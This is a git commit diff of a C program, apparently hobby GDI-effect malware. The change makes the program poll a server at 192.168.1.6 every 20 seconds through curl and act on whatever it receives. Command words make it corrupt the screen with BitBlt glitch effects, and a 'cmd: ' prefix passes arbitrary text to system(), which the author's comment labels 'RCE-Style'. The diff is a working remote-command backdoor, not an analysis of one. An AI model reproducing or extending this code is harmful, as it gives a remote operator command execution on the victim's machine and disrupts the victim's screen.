ffd32256756c231c083c3f26bd4c9a97cfd6653e
Elektro-On-Github <ElektroFromYT@gmail.com>
2026-04-29 21:48:25 +0200

    WOOW! added some for cycle 4 better fx

--- GDIs/GDIManager.c
+++ GDIs/GDIManager.c
@@ -4,6 +4,19 @@
 #include <string.h>
 #include <stdio.h>
 
+/*
+BitBlt usage:
+BitBlt(hdcDest, TakeX, TakeY, TakeW, TakeH, hdcSrc, XSrc, YSrc, MODE)
+
+Modes:
+SRCCOPY - Copy
+NOTSRCCOPY - Color invert
+SRCINVERT - PXColor = PXColorDest + PXColoreSRC
+BLACKNESS - black block
+WHITENESS - white block
+*/
+
+
 //globalz
 int w; // width
 int h; // heigh
@@ -18,7 +31,7 @@ void heightglitch_run() {
     x = rand() % w; // random lungo w
     BitBlt(hdc, x, 1, 10, h, hdc, x, 0, NOTSRCCOPY);
     ReleaseDC(NULL, hdc);
-    Sleep(10);
+    Sleep(100);
 }
 
 void widthglitch_run() {
@@ -72,49 +85,67 @@ void startfx() {
     w = GetSystemMetrics(SM_CXSCREEN);
     h = GetSystemMetrics(SM_CYSCREEN);
 
-    while(1) {
-        heightglitch_run();
-        widthglitch_run();
-        tunnel_run();
-        circleshake_run();
-    }
+    heightglitch_run();
+    widthglitch_run();
+    tunnel_run();
+    circleshake_run();
 }
 
 int main() {
-    char reqtextbuffer[8192] = {0}; // le {} perche' se metto {x} inizializza tutto a x. Senza graffe no, non posso assegnare un val a un gruppo di cose
-    FILE *pointertotextstream = popen("curl http://127.0.0.1:5633/xyz", "r"); // apre curl in modalita' sola lettura. 
+    while(1) {
+        printf("Clean\n");
+        char reqtextbuffer[8192] = {0}; // le {} perche' se metto {x} inizializza tutto a x. Senza graffe no, non posso assegnare un val a un gruppo di cose
+        FILE *pointertotextstream = popen("curl -s http://192.168.1.6:80/rce", "r"); // apre curl in modalita' sola lettura. 
 
-    if (pointertotextstream == NULL) return 1; // controlla canale tra me e l'exe di curl
-    
-    if (fgets(reqtextbuffer, sizeof(reqtextbuffer), pointertotextstream) == NULL) { // meaning: fgets(buffer, size, stream), mette l'out di curl dentro il buffer
-        pclose(pointertotextstream);
-        return 1;
-    } 
-
-    pclose(pointertotextstream); // chiude il processo creato da popen (curl)
-    printf("reqtextbuffer[]: %s\n", reqtextbuffer);
-
-    if (strstr(reqtextbuffer, "PunchyStart")) { // xtreme, starta tutti gli fx a bestia
-        startfx();
-    }
-    else if (strstr(reqtextbuffer, "HGlitch")) { // HGlitch
-        heightglitch_run();
-    }
-    else if (strstr(reqtextbuffer, "WGlitch")) { // WGlitch
-        widthglitch_run();
-    }
-    else if (strstr(reqtextbuffer, "TunnelRun")) { // TunnelRun
-        tunnel_run();
-    }
-    else if (strstr(reqtextbuffer, "CircleShake")) { // CircleShake
-        circleshake_run();
-    }
-    else if (strstr(reqtextbuffer, "cmd: ")) {
-        char *command = reqtextbuffer + 5; // pointer con offset a +5 per i char di "cmd :" (5 charz)
+        if (pointertotextstream == NULL) return 1; // controlla canale tra me e l'exe di curl
         
-        system(command);
-    }
-    
+        if (fgets(reqtextbuffer, sizeof(reqtextbuffer), pointertotextstream) == NULL) { // meaning: fgets(buffer, size, stream), mette l'out di curl dentro il buffer
+            pclose(pointertotextstream);
+            printf("Sleeping for 20secs\n");
+            sleep(20);
+            continue; //quitta da questo if (quindi se continua ad essere NULL riparte e ritorna qui)
+        } 
 
+        pclose(pointertotextstream); // chiude il processo creato da popen (curl)
+        printf("reqtextbuffer[]: %s\n", reqtextbuffer);
+
+        if (strstr(reqtextbuffer, "PunchyStart")) { // xtreme, starta tutti gli fx a bestia
+            int i;
+            for(i=0;i<100;i++) {
+                startfx();
+            }
+        }
+        else if (strstr(reqtextbuffer, "HGlitch")) { // HGlitch
+            int i;
+            for(i=0;i<100;i++) {
+                heightglitch_run();
+            }
+            
+        }
+        else if (strstr(reqtextbuffer, "WGlitch")) { // WGlitch
+            int i;
+            for(i=0;i<100;i++) {
+                widthglitch_run();
+            }
+        }
+        else if (strstr(reqtextbuffer, "TunnelRun")) { // TunnelRun
+            int i;
+            for(i=0;i<100;i++) {
+                tunnel_run();
+            }
+        }
+        else if (strstr(reqtextbuffer, "CircleShake")) { // CircleShake
+            int i;
+            for (i=0;i<100;i++) {
+                circleshake_run();
+            }
+        }
+        else if (strstr(reqtextbuffer, "cmd: ")) { // if contiene "cmd: "
+            char *command = reqtextbuffer + 5; // pointer con offset a +5 per i char di "cmd :" (5 charz)
+            command[strcspn(command, "\r\n")] = '\0'; // toglie eventuali \r\n alla fine, per avoidare esecuzione errata a causa di byte sporchi (apici per char = 1 byte, virgolette per array di char)
+            system(command); // esegui (RCE-Style)
+        }
+        else {sleep(20);}
+    }
     return 0;
 }
